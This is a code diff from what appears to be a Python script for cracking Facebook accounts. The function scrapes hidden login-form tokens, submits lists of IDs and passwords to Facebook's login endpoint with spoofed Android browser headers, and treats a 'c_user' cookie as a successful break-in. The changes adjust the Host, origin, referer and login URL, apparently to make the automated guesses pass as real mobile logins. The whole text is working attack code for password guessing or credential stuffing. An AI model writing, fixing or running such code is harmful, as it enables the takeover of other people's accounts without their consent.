@@ -319,7 +319,7 @@ def _M1_(ids,pasx):
                         free_fb = session.get('https://m.facebook.com').text
                         info={"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),"try_number":"0","unrecognized_tries":"0","email":ids,'pass':ps,"login":"Log In"}
                         had={
-                        'Host': f'https://x.facebook.com',
+                        'Host': f'm.facebook.com',
                         'content-length': '1662',
                         'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Android WebView";v="120"',
                         'sec-ch-ua-mobile': '?1',
@@ -337,14 +337,14 @@ def _M1_(ids,pasx):
                         'sec-ch-prefers-color-scheme': 'light',
                         'sec-ch-ua-platform': '"Android"',
                         'accept': '*/*',
-                        'origin': f'https://p.facebook.com',
+                        'origin': f'https://m.facebook.com',
                         'sec-fetch-site': 'same-origin',
                         'sec-fetch-mode': 'cors',
                         'sec-fetch-dest': 'empty',
-                        'referer': f'https://free.facebook.com',
+                        'referer': f'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100',
                         'accept-encoding': 'gzip, deflate, br',
                         'accept-language': 'en-IE,en-US;q=0.9,en;q=0.8'}
-                        url=f"https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100"
+                        url=f"https://www.facebook.com/login.php/?login_attempt=1&display=popup"
                         lo = session.post(url=url,data=info,headers=had).text
                         BLACK=session.cookies.get_dict().keys()
                         if 'c_user' in BLACK:
